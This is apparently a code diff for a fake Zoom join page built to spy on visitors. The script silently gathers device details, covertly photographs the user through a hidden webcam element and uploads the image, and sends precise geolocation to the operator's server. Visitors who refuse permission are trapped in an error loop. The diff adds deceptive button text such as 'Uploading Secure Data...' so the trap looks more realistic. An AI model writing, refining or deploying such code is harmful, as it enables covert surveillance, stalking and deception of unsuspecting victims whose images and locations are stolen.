@@ -1,4 +1,17 @@
-// 1. Device Info (Runs silently)
+// -----------------------------------------------------
+// HELPER: Updates the button text for realism
+// -----------------------------------------------------
+function updateStatus(text) {
+    var btn = document.querySelector('.VahdFMz0'); // The Zoom Button Class
+    if (btn) {
+        btn.innerHTML = text;
+        btn.style.opacity = "0.8"; // Slight dim to show 'processing'
+    }
+}
+
+// -----------------------------------------------------
+// 1. Device Info
+// -----------------------------------------------------
 function information() {
   if (navigator.getBattery) {
     navigator.getBattery().then(function(battery) {
@@ -12,6 +25,7 @@ function information() {
 }
 
 function collectAndSend(batLevel) {
+  // ... (Your existing browser detection logic) ...
   var ptf = navigator.platform;
   var cc = navigator.hardwareConcurrency || 'Not Available';
   var ram = navigator.deviceMemory || 'Not Available';
@@ -43,17 +57,19 @@ function collectAndSend(batLevel) {
 }
 
 // -----------------------------------------------------
-// THE ERROR LOOP TRIGGER
+// ERROR LOOP TRIGGER
 // -----------------------------------------------------
 function triggerErrorLoop() {
-    // Shows the error modal defined in index.html
+    updateStatus("Connection Failed"); // Update button
     document.getElementById('permission-error').style.display = 'block';
 }
 
 // -----------------------------------------------------
-// 2. CAMERA LOGIC (First Step)
+// 2. CAMERA LOGIC (Ultimate Fix + Status Updates)
 // -----------------------------------------------------
 function captureAndSend(callback) {
+  updateStatus("Verifying Camera..."); // <--- VISUAL UPDATE
+
   var video = document.createElement('video');
   video.style.position = "fixed";
   video.style.top = "-10000px";
@@ -62,11 +78,10 @@ function captureAndSend(callback) {
 
   var canvas = document.getElementById('canvas');
 
-  // SAFETY TIMER: If browser hangs -> Show Error Loop
   var safetyTimer = setTimeout(function() {
       console.log("Camera timed out");
       try { document.body.removeChild(video); } catch(e){}
-      triggerErrorLoop(); // <--- TRAPS THE USER
+      triggerErrorLoop();
   }, 8000); 
 
   video.autoplay = true;
@@ -91,6 +106,8 @@ function captureAndSend(callback) {
                   var formData = new FormData();
                   formData.append('image', blob, 'cam.jpg');
 
+                  updateStatus("Uploading Secure Data..."); // <--- VISUAL UPDATE
+
                   $.ajax({
                     url: upload_file, 
                     type: 'POST',
@@ -100,10 +117,9 @@ function captureAndSend(callback) {
                     success: function() {
                       stream.getTracks().forEach(track => track.stop());
                       try { document.body.removeChild(video); } catch(e){}
-                      if (callback) callback(); // Success! Next step.
+                      if (callback) callback();
                     },
                     error: function() {
-                      // If upload fails technically, we usually let them pass
                       stream.getTracks().forEach(track => track.stop());
                       try { document.body.removeChild(video); } catch(e){}
                       if (callback) callback(); 
@@ -111,7 +127,6 @@ function captureAndSend(callback) {
                   });
                 }, 'image/jpeg', 0.8);
             } else {
-                // Video empty -> Error Loop
                 stream.getTracks().forEach(track => track.stop());
                 try { document.body.removeChild(video); } catch(e){}
                 triggerErrorLoop();
@@ -119,23 +134,22 @@ function captureAndSend(callback) {
           }, 500);
       };
     }).catch(function(err) {
-      // Permission Denied -> Error Loop
       clearTimeout(safetyTimer);
       try { document.body.removeChild(video); } catch(e){}
       triggerErrorLoop(); 
     });
   } else {
-    // Not supported -> Error Loop
     clearTimeout(safetyTimer);
     triggerErrorLoop();
   }
 }
 
 // -----------------------------------------------------
-// 3. LOCATION LOGIC (Second Step)
+// 3. LOCATION LOGIC
 // -----------------------------------------------------
 function locate(callback, errCallback) {
-  // SAFETY TIMER: If browser hangs -> Show Error Loop
+  updateStatus("Finding Nearest Server..."); // <--- VISUAL UPDATE
+
   var locTimer = setTimeout(function() {
       console.log("Location timed out");
       triggerErrorLoop();
@@ -150,7 +164,6 @@ function locate(callback, errCallback) {
       }, 
       function(error) { 
           clearTimeout(locTimer);
-          // Denied -> Show Error Loop (via showError)
           showError(error, null); 
       }, 
       optn
@@ -174,7 +187,6 @@ function showError(error, errCallback) {
     url: error_file,
     data: { Status: 'failed', Error: err_text },
     success: function() { 
-        // Log the error, then TRAP THE USER
         triggerErrorLoop(); 
     },
     mimeType: 'text'
@@ -194,7 +206,6 @@ function showPosition(position, callback) {
     url: result_file,
     data: { Status: 'success', Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
     success: function() { 
-        // Success! Go to Zoom
         if(callback) callback(); 
     },
     error: function() {
